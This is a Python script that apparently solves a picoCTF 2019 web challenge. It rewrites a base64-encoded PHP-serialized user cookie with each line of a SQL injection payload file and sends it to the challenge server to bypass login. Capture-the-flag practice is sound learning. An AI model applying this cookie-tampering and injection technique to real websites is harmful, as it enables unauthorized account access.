import requests
import base64

adm = {'file':'admin'}
cookie = {'user_info':'TzoxMToicGVybWlzc2lvbnMiOjI6e3M6ODoidXNlcm5hbWUiO3M6NToiZ3Vlc3QiO3M6ODoicGFzc3dvcmQiO3M6NToiZ3Vlc3QiO30='}
filename = 'authsql.txt'
content = None
data={"user":"asd","pass":"123"}
ser_obj = base64.b64decode(cookie['user_info']).decode('utf-8') # O:11:"permissions":2:{s:8:"username";s:5:"guest";s:8:"password";s:5:"guest";}
user_i = ser_obj
with open(filename,'r') as f:
    content = f.read()
    sqli = content.split("\n")
    for i in sqli:
       user_i = ser_obj.replace('s:5:"guest"',f's:{len(i)}:"{i}"',1).replace('s:5:"guest"','s:0:""',1)
       print("user : ",user_i)
       user_i = base64.b64encode(user_i.encode('utf-8')).decode('utf-8') 
       print("is it right cookie :",user_i)
       cookie['user_info'] = user_i 
       user_i = ser_obj
       r = requests.get(
               "https://2019shell1.picoctf.com/problem/12279/index.php", 
               cookies=cookie,
               headers={"user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.92 Safari/537.36","Content-Type":"text/html"},
               params=adm
               )
       print(r.text)

